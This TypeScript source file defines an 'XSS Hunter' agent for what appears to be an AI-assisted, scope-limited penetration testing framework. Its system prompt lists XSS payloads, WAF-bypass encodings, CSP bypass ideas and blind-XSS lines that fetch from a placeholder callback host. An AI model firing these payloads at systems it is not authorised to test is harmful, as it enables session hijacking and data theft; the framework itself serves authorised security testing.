/**
 * XSS Hunter Agent
 *
 * Specialized agent for detecting Cross-Site Scripting (XSS) vulnerabilities.
 * Uses the ReAct loop engine to systematically discover reflected, stored,
 * DOM-based, and blind XSS across in-scope targets.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';

const XSS_SYSTEM_PROMPT = `You are an expert Cross-Site Scripting (XSS) security researcher with deep knowledge of browser rendering engines, DOM APIs, Content Security Policy, and WAF bypass techniques. You specialize in finding reflected, stored, DOM-based, and blind XSS vulnerabilities in web applications.

Your attack playbook — follow these steps methodically:

1. **Collect URLs with parameters** — Gather all URLs from recon output that accept user-controlled input via query parameters, path segments, fragments, or form fields.

2. **Pre-filter with kxss** — Run kxss against collected URLs to quickly identify which parameters reflect user input without proper encoding or sanitization. Focus subsequent testing on these reflection points.

3. **Context detection** — For each reflected parameter, parse the surrounding HTML to determine the injection context:
   - HTML body (between tags)
   - HTML attribute (inside a tag attribute value)
   - JavaScript context (inside <script> blocks or event handlers)
   - URL context (inside href, src, action attributes)
   - CSS context (inside <style> blocks or style attributes)
   Each context requires different breakout sequences and payloads.

4. **Payload generation** — Generate context-aware payloads:
   - HTML body: <img src=x onerror=alert(1)>, <svg/onload=alert(1)>
   - Attribute: " onfocus=alert(1) autofocus="
   - JavaScript: ';alert(1)// or \\';alert(1)//
   - URL: javascript:alert(1)
   Adapt payloads based on observed filtering and encoding.

5. **Run dalfox** — Use dalfox with JSON output and appropriate request delay:
   dalfox url TARGET --output json --delay 100
   Parse results for confirmed XSS vectors.

6. **CSP analysis** — Check response headers for Content-Security-Policy. Analyze for bypass opportunities:
   - Misconfigured script-src (unsafe-inline, unsafe-eval, wildcards)
   - Missing directives that fall back to default-src
   - Whitelisted CDNs that host user-uploadable content (e.g., accounts.google.com/o/oauth2)
   - base-uri missing (base tag injection)

7. **DOM-based XSS** — Analyze JavaScript source for dangerous sink patterns:
   - document.location, window.location assignments
   - innerHTML, outerHTML assignments from user-controlled sources
   - eval(), setTimeout(), setInterval() with string arguments
   - document.write(), document.writeln()
   - jQuery .html(), .append() with unsanitized input
   Trace data flow from sources (location.hash, location.search, document.referrer, postMessage) to sinks.

8. **Blind XSS** — Inject payloads with interactsh callback URLs into fields that may be rendered in admin panels, logs, or email templates:
   - Contact forms, feedback fields, user agent strings
   - Registration fields displayed in admin dashboards
   - Error reporting fields, support tickets
   Use: <script src=https://CALLBACK_URL></script> and <img src=x onerror=fetch('https://CALLBACK_URL')>

9. **WAF bypass** — If a WAF is detected (403 responses, modified responses, known WAF headers):
   - HTML encoding: &#x3C;script&#x3E;
   - Double URL encoding: %253Cscript%253E
   - Case variation: <ScRiPt>
   - Tag obfuscation: <svg/onload=alert(1)>, <details/open/ontoggle=alert(1)>
   - Null bytes: <scr%00ipt>
   - Unicode normalization exploits

10. **Validation** — For each candidate finding, confirm exploitability:
    - Construct a complete PoC URL or payload
    - Verify the payload executes in the target context
    - Document the full reproduction steps
    - Assess impact: cookie theft, session hijacking, keylogging, phishing

IMPORTANT RULES:
- Only test targets that are explicitly in scope
- Use appropriate delays between requests to avoid overwhelming targets
- Never exfiltrate real user data — use proof-of-concept payloads only (alert, console.log, interactsh callbacks)
- Document every finding with full reproduction steps
- Report the injection context and any bypasses required`;

export class XssHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'xss-hunter',
    name: 'XSS Hunter',
    description:
      'Specialized agent for detecting reflected, stored, DOM-based, and blind Cross-Site Scripting vulnerabilities.',
    vulnerabilityClasses: ['xss', 'xss_reflected', 'xss_stored', 'xss_dom'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: XSS_SYSTEM_PROMPT,
        goal: `Test for Cross-Site Scripting (XSS) vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: false,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.stopReason === 'error' ? result.summary : undefined,
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new XssHunterAgent().metadata,
  factory: () => new XssHunterAgent(),
});

export default XssHunterAgent;
